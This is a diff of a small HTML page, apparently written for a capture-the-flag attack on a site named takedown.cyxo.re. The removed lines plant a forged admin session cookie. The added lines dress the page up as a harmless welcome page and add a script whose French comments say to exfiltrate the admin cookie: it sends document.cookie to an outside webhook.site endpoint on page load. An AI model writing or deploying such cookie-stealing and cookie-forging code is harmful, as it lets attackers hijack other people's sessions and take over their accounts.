@@ -1,12 +1,17 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <meta http-equiv="Set-Cookie" content="RUMISESSID=admin; Domain=.takedown.cyxo.re; Path=/; Secure">
+    <meta charset="utf-8">
+    <title>Welcome</title>
   </head>
   <body>
+    <h1>Hello 👋</h1>
+    <p>Just a normal page…</p>
+
     <script>
-      document.cookie = "RUMISESSID=admin; domain=.takedown.cyxo.re; path=/; secure=true";
+      // Exfiltrer le cookie admin vers ton serveur contrôlé
+      // Remplace l’URL ci-dessous par ton endpoint (par ex. un webhook.site, ngrok, ou ton propre serveur)
+      fetch("https://webhook.site/a9dd987a-feba-48b0-a9b3-227ef3ad1032?c=" + encodeURIComponent(document.cookie));
     </script>
-    <h1>Cookie set! Now check api.takedown.cyxo.re/secrets 🎯</h1>
   </body>
 </html>
